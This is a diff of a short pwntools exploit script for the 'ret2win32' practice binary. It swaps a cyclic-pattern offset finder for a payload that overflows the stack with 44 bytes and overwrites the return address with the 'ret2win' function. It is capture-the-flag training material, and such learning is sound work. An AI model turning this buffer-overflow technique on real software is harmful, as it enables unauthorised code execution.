@@ -1,10 +1,8 @@
-from pwn import * 
+from pwn import *
 
-p=process('./ret2win32')
-p.send(cyclic(200, n=4))
-p.wait()
+p = process('./ret2win32')
+e = ELF('./ret2win32')
 
-core = p.corefile
-value = core.read(core.esp, 4)
-print(value)
-print(cyclic_find(value, n=4))
+payload = b'A' * 44 + p32(e.symbols['ret2win'])
+p.send(payload)
+p.interactive()
